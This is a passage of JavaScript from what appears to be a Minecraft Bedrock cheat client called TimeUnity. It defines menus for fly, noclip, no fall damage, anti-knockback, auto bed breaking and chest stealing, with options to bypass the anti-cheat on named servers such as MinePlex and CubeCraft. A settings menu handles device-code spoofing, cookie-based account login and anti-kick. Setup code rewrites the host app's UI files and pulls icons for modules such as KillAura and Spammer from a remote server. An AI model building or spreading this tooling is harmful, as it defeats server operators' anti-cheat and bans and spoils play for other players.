                }
            ]
        },
        {
            "type": "Switch",
            "name": "无摔落伤害",
            "color": "${main_item_color || "#121212"}",
            "tag": "fun_no_fall",
            "on_sound": "TimeUnity/开启音效.mp3",
            "off_sound": "TimeUnity/关闭音效.mp3",
            "items": [
                {
                    "type": "CheckBox",
                    "key": "vanilla",
                    "name": "Vanilla",
                    "color": "${menu_item_check_color || "#121212"}"
                },
                {
                    "type": "CheckBox",
                    "key": "mine_plex",
                    "name": "MinePlex",
                    "color": "${menu_item_check_color || "#121212"}"
                },
                {
                    "type": "CheckBox",
                    "key": "cube_craft",
                    "name": "CubeCraft",
                    "color": "${menu_item_check_color || "#121212"}"
                },
                {
                    "type": "CheckBox",
                    "key": "nukkit",
                    "name": "Nukkit",
                    "color": "${menu_item_check_color || "#121212"}"
                },
                {
                    "type": "CheckBox",
                    "key": "auth_ground_pos",
                    "name": "AuthGroundPos",
                    "color": "${menu_item_check_color || "#121212"}"
                },
                {
                    "type": "CheckBox",
                    "key": "no_move_check",
                    "name": "绕过移动检查",
                    "color": "${menu_item_check_color || "#121212"}",
                    "checked": false
                },
                {
                    "type": "CheckBox",
                    "key": "no_fall_check",
                    "name": "绕过摔落检查",
                    "color": "${menu_item_check_color || "#121212"}",
                    "checked": false
                }
            ]
        },
        {
            "type": "Switch",
            "name": "能力",
            "color": "${main_item_color || "#121212"}",
            "tag": "fun_abilities",
            "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "on_sound": "TimeUnity/开启音效.mp3",
            "off_sound": "TimeUnity/关闭音效.mp3",
            "off": "TimeUnity_Shortcut/close/Abilities.png",
            "on": "TimeUnity_Shortcut/open/Abilities.png",
            "icon": "TimeUnity_Shortcut/close/Abilities.png"
            },
            "items": [
                {
                    "type": "CheckBox",
                    "key": "flying",
                    "name": "飞行状态",
                    "color": "${menu_item_check_color || "#121212"}",
                    "checked": true
                },
                {
                    "type": "CheckBox",
                    "key": "noclip",
                    "name": "穿墙",
                    "color": "${menu_item_check_color || "#121212"}",
                    "checked": true
                },
                {
                    "type": "CheckBox",
                    "key": "op",
                    "name": "操作员",
                    "color": "${menu_item_check_color || "#121212"}",
                    "checked": false
                },
                {
                    "type": "SeekBar",
                    "key": "flySpeed",
                    "format": "飞行速度%.2f",
                    "color": "${main_item_color || "#121212"}",
                    "value": 0.1,
                    "min": 0.0,
                    "max": 10.0
                }
            ]
        },
        {
            "type": "Switch",
            "name": "灵魂出窍",
            "color": "${main_item_color || "#121212"}",
            "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "on_sound": "TimeUnity/开启音效.mp3",
            "off_sound": "TimeUnity/关闭音效.mp3",
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/Free_camera.png",
            "on": "TimeUnity_Shortcut/open/Free_camera.png",
            "icon": "TimeUnity_Shortcut/close/Free_camera.png"
            },
            "tag": "fun_free_camera"
        },
        {
            "type": "Switch",
            "name": "无受伤抖动",
            "color": "${main_item_color || "#121212"}",
            "tag": "fun_no_hurt_camera"
        },
        {
            "type": "Switch",
            "name": "自动挖床",
            "color": "${main_item_color || "#121212"}",
            "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "on_sound": "TimeUnity/开启音效.mp3",
            "off_sound": "TimeUnity/关闭音效.mp3",
            "off": "TimeUnity_Shortcut/close/Auto_destroy_block.png",
            "on": "TimeUnity_Shortcut/open/Auto_destroy_block.png",
            "icon": "TimeUnity_Shortcut/close/Auto_destroy_block.png"
            },
            "tag": "fun_auto_destroy_block",
            "items": [
                {
                    "type": "CheckBox",
                    "key": "minecraft:bed",
                    "name": "床",
                    "color": "${menu_item_check_color || "#121212"}",
                    "checked": true
                },
                {
                    "type": "SeekBar",
                    "key": "distance",
                    "format": "距离%.2f",
                    "color": "${main_item_color || "#121212"}",
                    "value": 7.0,
                    "min": 1.0,
                    "max": 40.0
                },
                {
                    "type": "RadioGroup",
                    "key": "packet_mode",
                    "name": "发包模式",
                    "color": "${main_item_color || "#121212"}",
                    "items": [
                        {
                            "key": "vanilla",
                            "name": "原版",
                            "color": "${main_item_color || "#121212"}",
                            "checked": true
                        },
                        {
                            "key": "nukkit",
                            "name": "Nukkit",
                            "color": "${main_item_color || "#121212"}"
                        }
                    ]
                }
            ]
        },
        {
            "type": "Switch",
            "name": "快速取物",
            "color": "${main_item_color || "#121212"}",
            "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "on_sound": "TimeUnity/开启音效.mp3",
            "off_sound": "TimeUnity/关闭音效.mp3",
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/Chest_stealer.png",
            "on": "TimeUnity_Shortcut/open/Chest_stealer.png",
            "icon": "TimeUnity_Shortcut/close/Chest_stealer.png"
            },
            "tag": "fun_chest_stealer",
            "items": [
                {
                    "type": "CheckBox",
                    "key": "auto_close",
                    "name": "自动关闭",
                    "color": "${menu_item_check_color || "#121212"}",
                    "checked": true
                },
                {
                    "type": "SeekBar",
                    "key": "slots",
                    "format": "每次拿%d组",
                    "color": "${main_item_color || "#121212"}",
                    "value": 1,
                    "min": 1,
                    "max": 10
                },
                {
                    "type": "SeekBar",
                    "key": "delay",
                    "format": "延迟%d",
                    "color": "${main_item_color || "#121212"}",
                    "value": 5,
                    "min": 0,
                    "max": 30
                }
            ]
        },
        {
            "type": "Switch",
            "name": "一步登天",
            "color": "${menu_item_check_color || "#121212"}",
            "on_sound": "TimeUnity/开启音效.mp3",
            "off_sound": "TimeUnity/关闭音效.mp3",
            "tag": "fun_step",
            "items": [
                {
                    "type": "SeekBar",
                    "key": "height",
                    "format": "高度%.2f",
                    "color": "${menu_item_check_color || "#121212"}",
                    "value": 1.0,
                    "min": 0.5625,
                    "max": 10.0
                }
            ]
        },
        {
            "type": "Switch",
            "name": "抗击退",
            "color": "${main_item_color || "#121212"}",
            "on_sound": "TimeUnity/开启音效.mp3",
            "off_sound": "TimeUnity/关闭音效.mp3",
            "tag": "fun_no_knockback",
            "items": [
                {
                    "type": "CheckBox",
                    "key": "all",
                    "name": "全部抗击退",
                    "color": "${menu_item_check_color || "#121212"}"
                },
                {
                    "type": "SeekBar",
                    "key": "horizontal",
                    "format": "水平%.2f",
                    "color": "${main_item_color || "#121212"}",
                    "value": 1.0,
                    "min": 0.1,
                    "max": 10.0
                },
                {
                    "type": "SeekBar",
                    "key": "vertical",
                    "format": "垂直%.2f",
                    "color": "${main_item_color || "#121212"}",
                    "value": 1.0,
                    "min": 0.1,
                    "max": 10.0
                }
            ]
        }
    ]
}`
const TU设置类 = `{
  "type": "Menu",
  "title": {
    "name": "『 TU-设置 』",
    "size": 16,
    "elevation": 3,
    "background": "${main_title_background || "#FFFFFF"}",
    "padding": [4, 2, 4, 2],
    "text_margins": [3, 2, 3, 2],
    "colors": ${JSON.stringify(main_title_colors || ["#FF0000", "#000F0F"])}
  },
  "color": "${main_color || "#FFFFFF"}",
  "alpha": ${main_alpha || 0.85},
  "radius": ${main_radius || 8},
  "can_close": true,
  "hide_fun": true,
  "hide": true,
  "items": [
    {
      "type": "TextView",
      "name": "『 TU-设置 』",
      "color": "${main_item_color || "#121212"}",
      "tag": "TU设置类",
      "items": [
        {
          "type": "TextView",
          "name": "显示设备码",
          "color": "#B4000000",
          "open": "TU设备码"
        },
        {
          "type": "TextView",
          "name": "随机设备码",
          "color": "#B4000000",
          "key": "RandomDeviceid"
        },
        {
           "type": "ColorPicker",
           "key": "CustomSky",
           "name": "         自定义天空",
           "color": "#B4000000",
           "default_color": "${main_color}",
           "ok": "确定",
           "cancel": "取消"
        },
        {
          "type": "TextView",
          "name": "修改名称",
          "color": "#B4000000",
          "key": "ChangeName"
        },
        {
          "type": "TextView",
          "name": "更新账号",
          "color": "#B4000000",
          "key": "UpdateUser"
        },
        {
          "type": "TextView",
          "name": "用户注册",
          "color": "#B4000000",
          "key": "Register"
        },
        {
          "type": "TextView",
          "name": "用户登录",
          "color": "#B4000000",
          "key": "Login"
        },
        {
          "type": "TextView",
          "name": "退出登录",
          "color": "#B4000000",
          "key": "ExitLogin"
        },
        {
          "type": "TextView",
          "name": "退出世界",
          "color": "#B4000000",
          "key": "leaveWorld"
        },
        {
          "type": "TextView",
          "name": "测试脚本",
          "color": "#B4000000",
          "load_script": "Test.js"
        },
        {
          "type": "Switch",
          "name": "4399登录",
          "color": "${main_item_color || "#121212"}",
          "key": "Sauth_4399Login",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "EditText",
          "name": "账号",
          "color": "${main_item_color || "#121212"}",
          "key": "Sauth_4399_User",
          "hint": "admin",
          "max_lines": 6
        },
        {
          "type": "EditText",
          "name": "密码",
          "color": "${main_item_color || "#121212"}",
          "key": "Sauth_4399_Pass",
          "hint": "123456789",
          "max_lines": 6
        },
        {
          "type": "Switch",
          "name": "Cookie登录",
          "color": "${main_item_color || "#121212"}",
          "key": "CookieLogin",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "EditText",
          "name": "Cookie",
          "color": "${main_item_color || "#121212"}",
          "key": "Cookie_Text",
          "max_lines": 6
        },
        {
          "type": "Switch",
          "name": "Cookie保存",
          "color": "${main_item_color || "#121212"}",
          "key": "SaveCookie",
          "checked": false,
          "on": "开启后登录账号保存Cookie",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "Switch",
          "name": "联机防踢",
          "color": "${main_item_color || "#121212"}",
          "key": "NoOnlineKick",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3"
        },
        {
          "type": "Switch",
          "name": "模块提示",
          "color": "${main_item_color || "#121212"}",
          "key": "ModuleTip",
          "checked": ${ModuleTip_Enabled},
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "消息模式",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "ModuleTip_MessageTip",
          "checked": ${ModuleTip_MessageTip}
        },
        {
          "type": "CheckBox",
          "name": "界面模式",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "ModuleTip_GUITip",
          "checked": ${ModuleTip_GUITip}
        },
        {
          "type": "Switch",
          "name": "FPS显示",
          "color": "${main_item_color || "#121212"}",
          "key": "ShowFPS",
          "checked": ${FPS_Enabled},
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3"
        },
        {
          "type": "Switch",
          "name": "调试模式",
          "color": "${main_item_color || "#121212"}",
          "key": "Debug",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3"
        }
      ]
    }
  ]
}`

const TU设备码 = `{
  "type": "Menu",
  "title": {
    "name": "『 TU-设备码 』",
    "size": 16,
    "elevation": 3,
    "background": "${main_title_background || "#FFFFFF"}",
    "padding": [4, 2, 4, 2],
    "text_margins": [3, 2, 3, 2],
    "colors": ${JSON.stringify(main_title_colors || ["#FF0000", "#000F0F"])}
  },
  "color": "${main_color || "#FFFFFF"}",
  "alpha": ${main_alpha || 0.85},
  "radius": ${main_radius || 8},
  "can_close": true,
  "hide_fun": true,
  "hide": true,
  "items": [
    {
      "type": "TextView",
      "name": "『 TU-设备码 』",
      "color": "${main_item_color || "#121212"}",
      "tag": "TU设备码",
      "items": [
        {
          "type": "EditText",
          "name": "设备码",
          "color": "${main_item_color || "#121212"}",
          "text": ${DeviceID},
          "max_lines": 6
        }
      ]
    }
  ]
}`

function LocalMenu() {
    try {
        const SaveMenu = {
            "TU主菜单": TU主菜单,
            "TU战斗类": TU战斗类,
            "TU移动类": TU移动类,
            "TU玩家类": TU玩家类,
            "TU辅助类": TU辅助类,
            "TU娱乐类": TU娱乐类,
            "TU渲染类": TU渲染类,
            "TU开发类": TU开发类,
            "TU原版类": TU原版类,
            "TU设置类": TU设置类
        };
        let main_path = _app.getResource() + "/ui";
        let ui_definition = JSON.parse(_fs.read(main_path + "/ui_definition.json"));
        let definition_fun = JSON.parse(_fs.read(_app.getResource() + "/ui/ui_definition.json"));
        if (ui_definition.ui.length === 0) {
            main_path = _app.getResource() + "/ui/NatureUI";
            ui_definition = JSON.parse(_fs.read(main_path + "/ui_definition.json"));
        }
        _fs.write(_app.getResource() + "/TimeUnity/UI_Version.json", JSON.stringify(UI_Version, null, 4));
        Object.keys(SaveMenu).forEach(MenuName => {
            const Menu_Path = "TimeUnity/" + MenuName;
            if (!ui_definition.ui.includes(Menu_Path)) {
                ui_definition.ui.push(Menu_Path);
            }
        });
        if (!_fs.exists(main_path + "/TimeUnity")) {
            _fs.createDirectory(main_path + "/TimeUnity");
        }
        Object.entries(SaveMenu).forEach(([FileName, MenuContent]) => {
            if (FileName !== "TU主菜单") {
                _fs.write(main_path + "/TimeUnity/" + FileName + ".json", MenuContent);
            } else {
                let TU_Main = JSON.parse(MenuContent);
                TU_Main.items[0].items.forEach(item => {
                    if (item.open && !item.open.startsWith("TimeUnity/")) {
                        item.open = "TimeUnity/" + item.open;
                    }
                });
                TU_Main.items[0].items = TU_Main.items[0].items.filter(item => item.key !== "TU_exit");
                TU_Main.can_close = true;
                TU_Main.hide_fun = true;
                TU_Main.hide = true;
                const items = TU_Main.items;
                delete TU_Main.items;
                const New_TU_Main = {
                    ...TU_Main,
                    can_close: true,
                    hide_fun: true,
                    hide: true,
                    items: items
                };
                _fs.write(main_path + "/TimeUnity/" + FileName + ".json", JSON.stringify(New_TU_Main, null, 4));
            }
        });
        if (definition_fun.fun && !definition_fun.fun.includes("TimeUnity")) definition_fun.fun.push("TimeUnity");
        _fs.write(_app.getResource() + "/ui/ui_definition.json", JSON.stringify(definition_fun, null, 4));
        _fs.write(main_path + "/ui_definition.json", JSON.stringify(ui_definition, null, 4));
    } catch (e) {
        _minecraft.clientMessage(`§c${e.stack}`);
    }
}

function CompareVersions(v1, v2) {
    const parts1 = v1.split('.').map(Number);
    const parts2 = v2.split('.').map(Number);
    const maxLength = Math.max(parts1.length, parts2.length);
    for (let i = 0; i < maxLength; i++) {
        const num1 = i < parts1.length ? parts1[i] : 0;
        const num2 = i < parts2.length ? parts2[i] : 0;
        if (num1 < num2) return -1;
        if (num1 > num2) return 1;
    }
    return 0;
}

function TU_UI() {
    try {
        let definition_ui = JSON.parse(_fs.read(_app.getResource() + "/ui/ui_definition.json"));
        if (definition_ui.fun && !definition_ui.fun.includes("TimeUnity")) {
            _menu.remove("TimeUnity");
            _menu.load("TimeUnity", TU主菜单);
            setTimeout(function () { try { _menu.show("TimeUnity"); } catch (e) {} }, 200);
            _menu.load("TU战斗类", TU战斗类);
            _menu.load("TU移动类", TU移动类);
            _menu.load("TU玩家类", TU玩家类);
            _menu.load("TU辅助类", TU辅助类);
            _menu.load("TU娱乐类", TU娱乐类);
            _menu.load("TU渲染类", TU渲染类);
            _menu.load("TU开发类", TU开发类);
            _menu.load("TU原版类", TU原版类);
            _menu.load("TU设置类", TU设置类);
        }
        _menu.load("TU设备码", TU设备码);
        _https.get("http://time.fuhongweb.cn/Cloud_Version", {}, function(code, response, headers) {
            if (code === 200 && response) {
                try {
                    UI_Version = JSON.parse(response);
                    if (_fs.exists(_app.getResource() + "/TimeUnity/UI_Version.json")) {
                        const Version = JSON.parse(_fs.read(_app.getResource() + "/TimeUnity/UI_Version.json"));
                        const Version_name = JSON.parse(response);
                        if (Version && Version.version_name && Version_name && Version_name.version_name) {
                            if (CompareVersions(Version.version_name, Version_name.version_name) < 0) {
                                _minecraft.clientMessage("§c当前TU本地UI版本过旧 §7请联系UI开发者更新");
                            }
                        }
                    }
                } catch (e) {
                    _minecraft.clientMessage("§c版本检查失败: §7", e.stack);
                }
            }
        });
    } catch (e) {
        _minecraft.clientMessage(`§c${e.stack}`);
    }
}

try {
    _menu.regFun("TimeUnity");
    _menu.regFun("TU战斗类");
    _menu.regFun("TU移动类");
    _menu.regFun("TU玩家类");
    _menu.regFun("TU辅助类");
    _menu.regFun("TU娱乐类");
    _menu.regFun("TU渲染类");
    _menu.regFun("TU设置类");
    _menu.regFun("TU开发类");
    _menu.regFun("TU账号列表");
    _menu.regFun("TU设备码");
    _menu.regFun("TimeUnity_Login");
    _menu.regFun("TimeUnity_Register");
    _menu.regFun("FriendCoordinates");
    _app.executePluginCommand("/ww hide false");
    if (_app.isInGame()) {
        self_id = getLocalPlayerUniqueID();
        LocalPlayerName = getEntityName(self_id);
        const RuntimeId = getLocalPlayerRuntimeID();
        if (RuntimeId !== "-10") {
            LocalRuntimeId = RuntimeId;
        } else {
            _minecraft.clientMessage("§l§b[TimeUnity]§r§7 >> §c运行ID获取失败，请重进世界");
        }
        if (LocalPlayerName) {
            PlayerMap.push({
                id: LocalRuntimeId,
                name: LocalPlayerName
            });
        }
    }
    callModule(41, JSON.stringify({
        short_name: true
    }));
    if (!_fs.exists(_app.getResource() + "/TimeUnity/")) _fs.createDirectory(_app.getResource() + "/TimeUnity/");
    if (!_fs.exists(_app.getResource() + "/TimeUnity/文件.json")) _fs.write(_app.getResource() + "/TimeUnity/文件.json", JSON.stringify(defaultData));
    if (!_fs.exists(_app.getResource() + "/TimeUnity/丢弃列表.json")) _fs.write(_app.getResource() + "/TimeUnity/丢弃列表.json", JSON.stringify(dropitemData));
    if (_fs.exists(_app.getResource() + "/TimeUnity/丢弃列表.json")) dropitemData = _fs.read(_app.getResource() + "/TimeUnity/丢弃列表.json");
    if (!_fs.exists(_app.getResource() + "/TimeUnity/Cmd.txt")) _fs.write(_app.getResource() + "/TimeUnity/Cmd.txt", "/tell @a 你好");
    if (!_fs.exists(_app.getResource() + "/TimeUnity/击杀文本.txt")) _fs.write(_app.getResource() + "/TimeUnity/击杀文本.txt", "!@{name} 你已被TimeUnity用户击败");
    _fs.write(_app.getResource() + "/TimeUnity/Simulated.json", JSON.stringify({
        Enable: false
    }, null, 2));
} catch (e) {
    _minecraft.clientMessage(`§c${e.stack}`);
}

function DownloadRes() {
    try {
        const Files = [{
                url: "http://time.fuhongweb.cn/文件/AutoBreak.png",
                path: "textures/TimeUnity_Shortcut/close/AutoBreak.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/AutoLoot.png",
                path: "textures/TimeUnity_Shortcut/close/AutoLoot.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/ChatLock.png",
                path: "textures/TimeUnity_Shortcut/close/ChatLock.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/AutoDrop.png",
                path: "textures/TimeUnity_Shortcut/close/AutoDrop.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/AutoRetaliate.png",
                path: "textures/TimeUnity_Shortcut/close/AutoRetaliate.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/GodMode.png",
                path: "textures/TimeUnity_Shortcut/close/GodMode.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/MegaTop.png",
                path: "textures/TimeUnity_Shortcut/close/MegaTop.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/InfiniteAura.png",
                path: "textures/TimeUnity_Shortcut/close/InfiniteAura.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/PacketDestroy.png",
                path: "textures/TimeUnity_Shortcut/close/PacketDestroy.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/NoGrave.png",
                path: "textures/TimeUnity_Shortcut/close/NoGrave.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Speed.png",
                path: "textures/TimeUnity_Shortcut/close/Speed.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/AutoBreak_open.png",
                path: "textures/TimeUnity_Shortcut/open/AutoBreak.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/AutoLoot_open.png",
                path: "textures/TimeUnity_Shortcut/open/AutoLoot.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/ChatLock_open.png",
                path: "textures/TimeUnity_Shortcut/open/ChatLock.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/AutoDrop_open.png",
                path: "textures/TimeUnity_Shortcut/open/AutoDrop.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/AutoRetaliate_open.png",
                path: "textures/TimeUnity_Shortcut/open/AutoRetaliate.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/GodMode_open.png",
                path: "textures/TimeUnity_Shortcut/open/GodMode.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Fly_open.png",
                path: "textures/TimeUnity_Shortcut/open/Fly.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Fly.png",
                path: "textures/TimeUnity_Shortcut/close/Fly.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/TeleMine.png",
                path: "textures/TimeUnity_Shortcut/close/TeleMine.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/TeleMine_open.png",
                path: "textures/TimeUnity_Shortcut/open/TeleMine.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/TickStop_open.png",
                path: "textures/TimeUnity_Shortcut/open/TickStop.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/TickStop.png",
                path: "textures/TimeUnity_Shortcut/close/TickStop.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/CmdFile_open.png",
                path: "textures/TimeUnity_Shortcut/open/CmdFile.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/CmdFile.png",
                path: "textures/TimeUnity_Shortcut/close/CmdFile.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Spammer_open.png",
                path: "textures/TimeUnity_Shortcut/open/Spammer.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Spammer.png",
                path: "textures/TimeUnity_Shortcut/close/Spammer.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Scaffold_open.png",
                path: "textures/TimeUnity_Shortcut/open/Scaffold.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Scaffold.png",
                path: "textures/TimeUnity_Shortcut/close/Scaffold.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/invManager_open.png",
                path: "textures/TimeUnity_Shortcut/open/invManager.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/invManager.png",
                path: "textures/TimeUnity_Shortcut/close/invManager.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/KillAura_open.png",
                path: "textures/TimeUnity_Shortcut/open/KillAura.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/KillAura.png",
                path: "textures/TimeUnity_Shortcut/close/KillAura.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Timer_open.png",
                path: "textures/TimeUnity_Shortcut/open/Timer.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Timer.png",
                path: "textures/TimeUnity_Shortcut/close/Timer.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Chest_stealer_open.png",
                path: "textures/TimeUnity_Shortcut/open/Chest_stealer.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Chest_stealer.png",
                path: "textures/TimeUnity_Shortcut/close/Chest_stealer.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Free_camera_open.png",
                path: "textures/TimeUnity_Shortcut/open/Free_camera.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Free_camera.png",
                path: "textures/TimeUnity_Shortcut/close/Free_camera.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Air_jump_open.png",
                path: "textures/TimeUnity_Shortcut/open/Air_jump.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Air_jump.png",
                path: "textures/TimeUnity_Shortcut/close/Air_jump.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Abilities_open.png",
                path: "textures/TimeUnity_Shortcut/open/Abilities.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Abilities.png",
                path: "textures/TimeUnity_Shortcut/close/Abilities.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Auto_destroy_block_open.png",
                path: "textures/TimeUnity_Shortcut/open/Auto_destroy_block.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Auto_destroy_block.png",
                path: "textures/TimeUnity_Shortcut/close/Auto_destroy_block.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/MegaTop_open.png",
                path: "textures/TimeUnity_Shortcut/open/MegaTop.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/InfiniteAura_open.png",
                path: "textures/TimeUnity_Shortcut/open/InfiniteAura.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/PacketDestroy_open.png",
                path: "textures/TimeUnity_Shortcut/open/PacketDestroy.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/NoGrave_open.png",
                path: "textures/TimeUnity_Shortcut/open/NoGrave.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Speed_open.png",
                path: "textures/TimeUnity_Shortcut/open/Speed.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/CrystalAura.png",
                path: "textures/TimeUnity_Shortcut/close/CrystalAura.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/CrystalAura_open.png",
                path: "textures/TimeUnity_Shortcut/open/CrystalAura.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/AutoBox.png",
                path: "textures/TimeUnity_Shortcut/close/AutoBox.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/AutoBox_open.png",
                path: "textures/TimeUnity_Shortcut/open/AutoBox.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/ChestStealer.png",
                path: "textures/TimeUnity_Shortcut/close/ChestStealer.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/ChestStealer_open.png",
                path: "textures/TimeUnity_Shortcut/open/ChestStealer.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/MoveJump.png",
                path: "textures/TimeUnity_Shortcut/close/MoveJump.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/MoveJump_open.png",
                path: "textures/TimeUnity_Shortcut/open/MoveJump.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Replication.png",
                path: "textures/TimeUnity_Shortcut/close/Replication.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Replication_open.png",
                path: "textures/TimeUnity_Shortcut/open/Replication.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/SpeedDestroy.png",
                path: "textures/TimeUnity_Shortcut/close/SpeedDestroy.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/SpeedDestroy_open.png",
                path: "textures/TimeUnity_Shortcut/open/SpeedDestroy.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Hammer.png",
                path: "textures/TimeUnity_Shortcut/close/Hammer.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Hammer_open.png",
                path: "textures/TimeUnity_Shortcut/open/Hammer.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/AntiVoid.png",
                path: "textures/TimeUnity_Shortcut/close/AntiVoid.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/AntiVoid_open.png",
                path: "textures/TimeUnity_Shortcut/open/AntiVoid.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/AutoDestroyBed.png",
                path: "textures/TimeUnity_Shortcut/close/AutoDestroyBed.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/AutoDestroyBed_open.png",
                path: "textures/TimeUnity_Shortcut/open/AutoDestroyBed.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/AutoTool.png",
                path: "textures/TimeUnity_Shortcut/close/AutoTool.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/AutoTool_open.png",
                path: "textures/TimeUnity_Shortcut/open/AutoTool.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/BackTrack.png",
                path: "textures/TimeUnity_Shortcut/close/BackTrack.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/BackTrack_open.png",
                path: "textures/TimeUnity_Shortcut/open/BackTrack.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/BJDFly.png",
                path: "textures/TimeUnity_Shortcut/close/BJDFly.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/BJDFly_open.png",
                path: "textures/TimeUnity_Shortcut/open/BJDFly.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Blink.png",
                path: "textures/TimeUnity_Shortcut/close/Blink.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Blink_open.png",
                path: "textures/TimeUnity_Shortcut/open/Blink.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Critical.png",
                path: "textures/TimeUnity_Shortcut/close/Critical.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Critical_open.png",
                path: "textures/TimeUnity_Shortcut/open/Critical.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/JumpSpeed.png",
                path: "textures/TimeUnity_Shortcut/close/JumpSpeed.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/JumpSpeed_open.png",
                path: "textures/TimeUnity_Shortcut/open/JumpSpeed.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Killnsult.png",
                path: "textures/TimeUnity_Shortcut/close/Killnsult.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/Killnsult_open.png",
                path: "textures/TimeUnity_Shortcut/open/Killnsult.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/BJDSpeed.png",
                path: "textures/TimeUnity_Shortcut/close/BJDSpeed.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/BJDSpeed_open.png",
                path: "textures/TimeUnity_Shortcut/open/BJDSpeed.png"
            },
            {
                url: "http://time.fuhongweb.cn/文件/攻击音效.mp3",
